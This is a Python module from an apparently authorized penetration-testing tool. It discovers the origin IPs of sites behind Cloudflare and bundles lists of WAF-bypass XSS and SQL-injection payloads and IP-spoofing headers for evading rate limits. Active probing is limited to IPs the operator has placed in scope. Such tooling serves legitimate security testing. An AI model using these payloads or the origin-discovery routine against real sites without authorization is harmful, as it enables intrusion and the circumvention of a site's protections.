"""Cloudflare-specific bypass techniques and origin IP discovery."""
from __future__ import annotations

import asyncio
import ipaddress
import re
import socket
import ssl
from typing import Any
from urllib.parse import urlsplit

from talisman.engine.scope import ScopeViolationError
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)

# Known Cloudflare IP ranges (abbreviated — full list at https://www.cloudflare.com/ips/)
CLOUDFLARE_IP_RANGES = [
 "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
 "104.16.0.0/13", "104.24.0.0/14", "108.162.192.0/18",
 "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15",
 "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
 "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
]

CF_XSS_BYPASSES = [
 "<details/open/ontoggle=alert(1)>",
 "<svg><animatetransform onbegin=alert(1)>",
 "<img src onerror=alert(1)>",
 "<img\rsrc=x\ronerror=alert(1)>",
 "<script>onerror=alert;throw 1</script>",
 "<svg><set attributename=onmouseover value=alert(1)>",
 "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
 "<!--<img src=--><img src=x onerror=alert(1)//>",
 "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
 "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
 "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'>",
 "<input autofocus onfocus=alert(1)>",
]

CF_SQLI_BYPASSES = [
 "1.0e1 OR 1=1",
 "1/*!50000UNION*//*!50000SELECT*/1,2,3--",
 "1 UnIoN SeLeCt 1,2,3--",
 "1%09UNION%09ALL%09SELECT%091,2,3--",
 "1 OR 0x1=0x1",
 "1 OR 1 LIKE 1",
 "1 OR 1 REGEXP 1",
 "1 OR 1 BETWEEN 0 AND 2",
 "1%2520UNION%2520SELECT%25201",
 "1/**/UNION/**/SELECT/**/1,2,3",
 "1 UNION ALL SELECT NULL--",
 "1' OR 1=1 LIMIT 1--",
]

CF_RATE_LIMIT_BYPASS_HEADERS = [
 {"X-Forwarded-For": "127.0.0.1"},
 {"CF-Connecting-IP": "1.1.1.1"},
 {"X-Real-IP": "127.0.0.1"},
 {"True-Client-IP": "127.0.0.1"},
 {"X-Client-IP": "127.0.0.1"},
 {"X-Originating-IP": "127.0.0.1"},
 {"Forwarded": "for=127.0.0.1"},
]

# Paths commonly set to lower security level in Cloudflare Page Rules
CF_LOW_SECURITY_PATHS = [
 "/cdn-cgi/", "/wp-json/", "/api/", "/xmlrpc.php",
 "/wp-cron.php", "/?feed=rss2", "/graphql", "/rest/",
 "/.well-known/", "/robots.txt", "/sitemap.xml",
]


async def _crtsh_ips(domain: str, client: TalismanHTTPClient) -> list[str]:
 ips: list[str] = []
 try:
  r = await client.get(
   f"https://crt.sh/?q={domain}&output=json", timeout=20
  )
  if r.status_code == 200:
   ip_re = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
   ips.extend(ip_re.findall(r.text))
 except Exception:
  pass
 return list(set(ips))


async def _shodan_ips(domain: str, api_key: str, client: TalismanHTTPClient) -> list[str]:
 ips: list[str] = []
 if not api_key:
  return ips
 try:
  r = await client.get(
   f"https://api.shodan.io/dns/domain/{domain}?key={api_key}", timeout=15
  )
  if r.status_code == 200:
   data = r.json()
   for entry in data.get("data", []):
    if "value" in entry:
     ip_re = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
     matches = ip_re.findall(entry["value"])
     ips.extend(matches)
 except Exception:
  pass
 return list(set(ips))


async def _mx_ips(domain: str, scope: Any) -> list[str]:
 """MX records often not behind Cloudflare."""
 import aiodns
 resolver = aiodns.DNSResolver()
 ips: list[str] = []
 try:
  async with scope.request_concurrency_slot():
   await scope.acquire_request_slot()
   mx_records = await resolver.query(domain, "MX")
  for mx in mx_records:
   try:
    async with scope.request_concurrency_slot():
     await scope.acquire_request_slot()
     a_records = await resolver.query(str(mx.host), "A")
    ips.extend(r.host for r in a_records)
   except Exception:
    pass
 except Exception:
  pass
 return ips


async def _verify_origin(domain: str, ip: str, scope: Any) -> bool:
 """Probe an explicitly scoped IP while preserving the domain's TLS SNI and Host.

 A response is only a candidate signal; it is not proof of authoritative origin
 status or provider-resource claimability.
 """
 for scheme, port in (("https", 443), ("http", 80)):
  destination = f"{scheme}://{ip}:{port}/"
  try:
   async with scope.request_concurrency_slot():
    addresses = await scope.resolve_network_destination(destination, "GET")
    await scope.acquire_request_slot()
    connect_ip = str(addresses[0])

    def _probe() -> bool:
     raw_socket: socket.socket | None = None
     active_socket: socket.socket | None = None
     try:
      raw_socket = socket.create_connection((connect_ip, port), timeout=8)
      raw_socket.settimeout(5)
      if scheme == "https":
       context = ssl.create_default_context()
       active_socket = context.wrap_socket(
        raw_socket,
        server_hostname=domain,
       )
       raw_socket = None
      else:
       active_socket = raw_socket
       raw_socket = None

      request = (
       f"GET / HTTP/1.1\r\n"
       f"Host: {domain}\r\n"
       "User-Agent: TALISMAN/1.1 (+authorized security testing)\r\n"
       "Accept: */*\r\n"
       "Connection: close\r\n\r\n"
      ).encode("ascii")
      active_socket.sendall(request)
      response = active_socket.recv(8192)
      header_block, separator, body = response.partition(b"\r\n\r\n")
      if not separator or not header_block.startswith(b"HTTP/"):
       return False
      status_line = header_block.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
      try:
       status_code = int(status_line.split()[1])
      except (IndexError, ValueError):
       return False
      content = (header_block + body).lower()
      if status_code >= 500 or len(body) < 100:
       return False
      if b"cloudflare" in content or b"cf-ray" in content:
       return False
      return True
     except (OSError, ssl.SSLError, TimeoutError, ValueError):
      return False
     finally:
      if active_socket is not None:
       try:
        active_socket.close()
       except OSError:
        pass
      if raw_socket is not None:
       try:
        raw_socket.close()
       except OSError:
        pass

    if await asyncio.to_thread(_probe):
     return True
  except Exception:
   # A failed TLS check is not bypassed by disabling certificate validation.
   # The HTTP fallback is a separate, explicitly scoped request.
   continue
 return False


async def find_origin(
 target: str,
 proxy: str | None = None,
 shodan_key: str | None = None,
 scope: Any = None,
 **kwargs: Any,
) -> dict[str, Any]:
 parsed_target = urlsplit(target if "://" in target else f"https://{target}")
 domain = (parsed_target.hostname or "").rstrip(".").lower()
 if not domain:
  return {"domain": target, "candidates": [], "confirmed_origins": [], "origin_found": False, "error": "invalid_target"}
 if scope is None:
  return {
   "domain": domain,
   "candidates": [],
   "confirmed_origins": [],
   "origin_found": False,
   "error": "scope_enforcer_required",
  }
 try:
  scope.assert_in_scope(target)
 except ScopeViolationError as exc:
  return {
   "domain": domain,
   "candidates": [],
   "confirmed_origins": [],
   "origin_found": False,
   "error": str(exc),
  }

 console.print(
  f"\n[module][+] Scoped Cloudflare Origin Candidate Discovery[/module] -> [target]{domain}[/target]"
 )

 candidates: list[str] = []
 responding_candidates: list[str] = []
 out_of_scope_candidates: list[str] = []

 async with TalismanHTTPClient(
  proxy=proxy, timeout=20, scope=scope, follow_redirects=False
 ) as client:
  tasks = [
   _crtsh_ips(domain, client),
   _mx_ips(domain, scope),
  ]
  if shodan_key:
   tasks.append(_shodan_ips(domain, shodan_key, client))

  results = await asyncio.gather(*tasks, return_exceptions=True)
  for result in results:
   if isinstance(result, list):
    candidates.extend(result)

  # Filter out Cloudflare addresses and malformed records.
  cf_nets = []
  for cidr in CLOUDFLARE_IP_RANGES:
   try:
    cf_nets.append(ipaddress.ip_network(cidr))
   except ValueError:
    pass

  non_cf_candidates: list[str] = []
  for value in set(candidates):
   try:
    address = ipaddress.ip_address(value)
    if not any(address in network for network in cf_nets):
     non_cf_candidates.append(str(address))
   except ValueError:
    pass

  # Discovery does not authorize a new destination. Only actively verify an
  # origin address if the operator explicitly listed that IP/CIDR in scope.
  authorized_candidates = [
   ip for ip in non_cf_candidates if scope.is_in_scope(ip)
  ]
  out_of_scope_candidates = [
   ip for ip in non_cf_candidates if not scope.is_in_scope(ip)
  ]

  console.print(
   f" {len(non_cf_candidates)} non-Cloudflare candidates; "
   f"{len(authorized_candidates)} explicitly authorized for verification"
  )

  verify_tasks = [
   _verify_origin(domain, ip, scope)
   for ip in authorized_candidates[:20]
  ]
  verify_results = await asyncio.gather(*verify_tasks, return_exceptions=True)

  for ip, response_matches in zip(authorized_candidates[:20], verify_results):
   if response_matches is True:
    responding_candidates.append(ip)
    console.print(
     f" [success][+] In-scope IP returned a non-CDN response for {domain}: {ip}[/success]"
    )

 if not responding_candidates:
  console.print(" [dim]No in-scope IP returned a matching non-CDN response[/dim]")

 return {
  "domain": domain,
  "candidates": non_cf_candidates,
  "verified_candidates": authorized_candidates,
  "out_of_scope_candidates": out_of_scope_candidates,
  "responding_candidates": responding_candidates,
  "confirmed_origins": [],
  "origin_found": False,
  "requires_manual_origin_confirmation": True,
  "verification_required": (
   "A non-CDN HTTP response is not proof that an IP is the authoritative origin "
   "or that the provider resource is unclaimed. Confirm the current DNS CNAME "
   "chain and provider-side resource state independently before reporting takeover."
  ),
 }


def get_xss_bypasses() -> list[str]:
 return CF_XSS_BYPASSES


def get_sqli_bypasses() -> list[str]:
 return CF_SQLI_BYPASSES


def get_rate_limit_bypass_headers() -> list[dict[str, str]]:
 return CF_RATE_LIMIT_BYPASS_HEADERS


def get_low_security_paths() -> list[str]:
 return CF_LOW_SECURITY_PATHS


async def run(target: str, **kwargs: Any) -> dict[str, Any]:
 """Registry-compatible entry point that calls find_origin."""
 return await find_origin(target, **kwargs)
